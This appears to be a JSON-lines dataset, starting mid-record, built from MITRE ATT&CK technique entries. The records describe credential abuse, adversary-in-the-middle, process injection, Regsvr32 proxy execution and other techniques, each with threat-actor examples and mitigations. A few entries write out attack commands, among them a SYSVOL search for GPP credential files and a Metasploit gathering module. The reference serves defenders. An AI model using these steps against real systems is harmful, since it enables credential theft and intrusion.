conduct distributed, large-scale password spray attacks.", "Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.", "Refer to NIST guidelines when creating password policies. ", "APT29 has conducted brute force password spray attacks.", "Bad Rabbit’s <code>infpub.dat</code> file uses NTLM login credentials to brute force Windows machines.", "Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.", "APT33 has used password spraying to gain access to target systems.", "Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying.", "Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.", "CrackMapExec can brute force credential authentication by using a supplied list of usernames and a single password."], "is_subtechnique": true}
{"text": " Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts) Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.", "idx": "https://attack.mitre.org/techniques/T1078/002", "title": "Domain Accounts", "entity": "Domain Accounts", "entity_type": "techniques", "entity_context": ["Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account.", "APT3 leverages valid accounts after gaining credentials for use within the victim domain.", "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs.", "Sandworm Team has used stolen credentials to access administrative accounts within the domain.", "TA505 has used stolen domain admin accounts to compromise additional hosts.", "Chimera has used compromised domain accounts to gain access to the target environment.", "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.", "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications.", "Indrik Spider has collected credentials from infected systems, including domain accounts.", "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.", "Stuxnet attempts to access network resources with a domain account’s credentials.", "Operation Wocao has used domain credentials, including domain admin, for lateral movement and privilege escalation.", "APT29 has used valid accounts, including administrator accounts, to help facilitate lateral movement on compromised networks.", "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.", "Ryuk can use stolen domain admin accounts to move laterally within a victim domain.", "Naikon has used administrator credentials for lateral movement in compromised networks.", "Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained."], "is_subtechnique": true}
{"text": " Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics) Adversaries may leverage the AiTM position to attempt to modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.", "idx": "https://attack.mitre.org/techniques/T1557", "title": "Adversary-in-the-Middle", "entity": "Adversary-in-the-Middle", "entity_type": "techniques", "entity_context": ["Use network appliances and host-based security software to block network traffic that is not necessary within the environment, such as legacy protocols that may be leveraged for AiTM conditions.", "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.", "Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity.", "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS.", "Disable legacy network protocols that may be used   to intercept network traffic if applicable, especially those that are not needed within an environment.", "Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host.", "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level.", "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.", "Limit access to network infrastructure and resources that can be used to reshape traffic or otherwise produce AiTM conditions."], "is_subtechnique": false}
{"text": " Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016) These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key) The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files: * Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code> * Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword) * gpprefdecrypt.py On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>", "idx": "https://attack.mitre.org/techniques/T1552/006", "title": "Group Policy Preferences", "entity": "Group Policy Preferences", "entity_type": "techniques", "entity_context": ["Remove vulnerable Group Policy Preferences.", "Apply patch KB2962486 which prevents credentials from being stored in GPPs.", "APT33 has used a variety of publicly available tools like Gpppassword to gather credentials.", "Search SYSVOL for any existing GGPs that may contain credentials and remove them.", "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences."], "is_subtechnique": true}
{"text": " Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).", "idx": "https://attack.mitre.org/techniques/T1134/005", "title": "SID-History Injection", "entity": "SID-History Injection", "entity_type": "techniques", "entity_context": ["Mimikatz's <code>MISC::AddSid</code> module can appended any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.", "Clean up SID-History attributes after legitimate account migration is complete.\n\nConsider applying SID Filtering to interforest trusts, such as forest trusts and external trusts, to exclude SID-History from requests to access domain resources. SID Filtering ensures that any authentication requests over a trust only contain SIDs of security principals from the trusted domain (i.e preventing the trusted domain from claiming a user has membership in groups outside of the domain).\n\nSID Filtering of forest trusts is enabled by default, but may have been disabled in some cases to allow a child domain to transitively access forest trusts. SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers.   However note that SID Filtering is not automatically applied to legacy trusts or may have been deliberately disabled to allow inter-domain access to resources.\n\nSID Filtering can be applied by: \n\n* Disabling SIDHistory on forest trusts using the netdom tool (<code>netdom trust /domain: /EnableSIDHistory:no</code> on the domain controller)\n\n* Applying SID Filter Quarantining to external trusts using the netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /quarantine:yes</code> on the domain controller)\n\n* Applying SID Filtering to domain trusts within a single forest is not recommended as it is an unsupported configuration and can cause breaking changes.   If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust", "Empire can add a SID-History to a user if on a domain controller."], "is_subtechnique": true}
{"text": " Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)", "idx": "https://attack.mitre.org/techniques/T1036/003", "title": "Rename System Utilities", "entity": "Rename System Utilities", "entity_type": "techniques", "entity_context": ["The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.", "APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection.", "GALLIUM used a renamed cmd.exe file to evade detection.", "menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.", "Use file system access controls to protect folders such as C:\\Windows\\System32."], "is_subtechnique": true}
{"text": " **This technique has been deprecated. Please use [Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception by Search Order Hijacking](https://attack.mitre.org/techniques/T1574/008), and/or [Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009).** Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019) There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process. ### Unquoted Paths Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at", "idx": "https://attack.mitre.org/techniques/T1034", "title": "Path Interception", "entity": "Path Interception", "entity_type": "techniques", "entity_context": ["Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution.", "Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. ", "Require that all executables be placed in write-protected directories.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables.", "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them . Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate . \n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. "], "is_subtechnique": false}
{"text": " Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "idx": "https://attack.mitre.org/techniques/T1052/001", "title": "Exfiltration over USB", "entity": "Exfiltration over USB", "entity_type": "techniques", "entity_context": ["Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if they are not required for business operations. ", "Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks.", "USBStealer exfiltrates collected files via removable media from air-gapped victims.", "Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.", "Data loss prevention can detect and block sensitive data being copied to USB devices.", "SPACESHIP copies staged data to removable drives when they are inserted into the system.", "Limit the use of USB devices and removable media within a network.", "Machete has a feature to copy files from every drive onto a removable drive in a hidden folder.", "Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.", "Tropic Trooper has exfiltrated data using USB storage devices.\t"], "is_subtechnique": true}
{"text": " Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group. With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance). Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google (Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation). Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.", "idx": "https://attack.mitre.org/techniques/T1069/003", "title": "Cloud Groups", "entity": "Cloud Groups", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting) Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.", "idx": "https://attack.mitre.org/techniques/T1542", "title": "Pre-OS Boot", "entity": "Pre-OS Boot", "entity_type": "techniques", "entity_context": ["Patch the BIOS and EFI as necessary.", "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.  ", "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"], "is_subtechnique": false}
{"text": " Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure. Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)", "idx": "https://attack.mitre.org/techniques/T1583/003", "title": "Virtual Private Server", "entity": "Virtual Private Server", "entity_type": "techniques", "entity_context": ["TEMP.Veles has used Virtual Private Server (VPS) infrastructure.", "HAFNIUM has operated from leased virtual private servers (VPS) in the United States.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) An adversary may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps. Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)", "idx": "https://attack.mitre.org/techniques/T1584/001", "title": "Domains", "entity": "Domains", "entity_type": "techniques", "entity_context": ["APT29 has compromised domains to use for C2.", "Magic Hound has used compromised domains to host links targeted to specific phishing victims.", "APT1 hijacked FQDNs associated with legitimate websites hosted by hop points.", "Transparent Tribe has compromised domains for use in targeted malicious campaigns.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms) Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)", "idx": "https://attack.mitre.org/techniques/T1137/003", "title": "Outlook Forms", "entity": "Outlook Forms", "entity_type": "techniques", "entity_context": ["On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems.", "Ruler can be used to automate the abuse of Outlook Forms to establish persistence."], "is_subtechnique": true}
{"text": " Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.", "idx": "https://attack.mitre.org/techniques/T1205/001", "title": "Port Knocking", "entity": "Port Knocking", "entity_type": "techniques", "entity_context": ["PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.", "Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented."], "is_subtechnique": true}
{"text": " An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable. An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)", "idx": "https://attack.mitre.org/techniques/T1578/003", "title": "Delete Cloud Instance", "entity": "Delete Cloud Instance", "entity_type": "techniques", "entity_context": ["Routinely check user permissions to ensure only the expected users have the capability to delete new instances.", "Limit permissions for deleting new instances in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."], "is_subtechnique": true}
{"text": " An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML) An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users. An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)", "idx": "https://attack.mitre.org/techniques/T1606/002", "title": "SAML Tokens", "entity": "SAML Tokens", "entity_type": "techniques", "entity_context": ["APT29 created tokens using compromised SAML signing certificates.", "Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles.", "Restrict permissions and access to the AD FS server to only originate from privileged access workstations.", "For containing the impact of a previously forged SAML token, rotate the token-signing AD FS certificate in rapid succession twice, which will invalidate any tokens generated using the previous certificate.", "Enable advanced auditing on AD FS. Check the success and failure audit options in the AD FS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object."], "is_subtechnique": true}
{"text": " Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "idx": "https://attack.mitre.org/techniques/T1055", "title": "Process Injection", "entity": "Process Injection", "entity_type": "techniques", "entity_context": ["ABK has the ability to inject shellcode into svchost.exe.", "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.", "PoshC2 contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.", "Backdoor.Oldrea injects itself into explorer.exe.", "REvil can inject itself into running processes on a compromised host.", "Waterbear can inject decrypted shellcode into the LanmanServer service.", "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process.", "AuditCred can inject code from files to other running processes.", "HyperBro can run shellcode it injects into a newly created process.", "Operation Wocao has injected code into a selected process, which in turn launches a command as a child process of the original.", "Avenger has the ability to inject shellcode into svchost.exe.", "SLOTHFULMEDIA can inject into running processes on a compromised host.", "Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.", "HOPLIGHT has injected into running processes.\t", "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.", "Agent Tesla can inject into known, vulnerable binaries on targeted hosts. ", "PLATINUM has used various methods of process injection including hot patching.", "Cardinal RAT injects into a newly spawned process created from a native Windows executable.", "QakBot can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.", "Remcos has a command to hide itself through injecting into another process.", "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.", "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.", "gh0st RAT can inject malicious code into process created by the “Command_Create&Inject” function.", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection. ", "Sliver can inject code into local and remote processes.", "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.", "Dyre has the ability to directly inject its code into the web browser process.", "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.", "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.", "Honeybee uses a batch file to load a DLL into the svchost.exe process.", "Turla has also used PowerSploit's <code>Invoke-ReflectivePEInjection.ps1</code> to reflectively load a PowerShell payload into a random process on the victim system.", "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.", "Wiarp creates a backdoor through which remote attackers can inject files into running processes.", "TrickBot has used <code>Nt*</code> Native API functions to inject code into legitimate processes such as <code>wermgr.exe</code>.", "Wingbird performs multiple process injections to hijack system processes and execute malicious code.", "Smoke Loader injects into the Internet Explorer process.", "Cobalt Group has injected code into trusted processes.", "Empire contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.", "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.", "Ryuk has injected itself into remote processes to encrypt files using a combination of <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>.", "ShadowPad has injected an install module into a newly created process.", "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.", "HTRAN can inject into into running processes.", "JHUHUGIT performs code injection injecting its own functions to browser processes.", "BBK has the ability to inject shellcode into svchost.exe.", "JPIN can inject content into lsass.exe to load a module.", "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.", "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.", "Gazer injects its communication module into an Internet accessible process through which it performs C2.", "Bazar can inject code through calling <code>VirtualAllocExNuma</code>.", "Egregor can inject its payload into iexplore.exe process.", "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.", "NavRAT copies itself into a running Internet Explorer process to evade detection."], "is_subtechnique": false}
{"text": " Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules) Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)", "idx": "https://attack.mitre.org/techniques/T1137/005", "title": "Outlook Rules", "entity": "Outlook Rules", "entity_type": "techniques", "entity_context": ["On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems.", "Ruler can be used to automate the abuse of Outlook Rules to establish persistence. "], "is_subtechnique": true}
{"text": " Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32) Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)", "idx": "https://attack.mitre.org/techniques/T1218/010", "title": "Regsvr32", "entity": "Regsvr32", "entity_type": "techniques", "entity_context": ["Egregor has used regsvr32.exe to execute malicious DLLs.", "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass application control.  Identify and block potentially malicious software executed through regsvr32 functionality by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. ", "Koadic can use Regsvr32 to execute additional payloads.", "Leviathan has used regsvr32 for execution.", "Inception has ensured persistence at system boot by setting the value <code>regsvr32 %path%\\ctfmonrn.dll /s</code>.", "Cobalt Group has used regsvr32.exe to execute scripts.", "RogueRobin uses regsvr32.exe to run a .sct file for execution.", "Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.", "QakBot can use Regsvr32 to execute malicious DLLs.", "EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe. ", "WIRTE has used Regsvr32.exe to trigger the execution of a malicious script.", "Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.", "AppleSeed can call regsvr32.exe for execution.", "Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.", "Xbash can use regsvr32 for executing scripts.", "More_eggs has used regsvr32.exe to execute the malicious DLL.", "APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor. ", "APT19 used Regsvr32 to bypass application control techniques.", "Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.", "Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.", "Valak has used <code>regsvr32.exe</code> to launch malicious DLLs.", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.\t", "Astaroth can be loaded through regsvr32.exe.", "TA551 has used regsvr32.exe to load malicious DLLs."], "is_subtechnique": true}
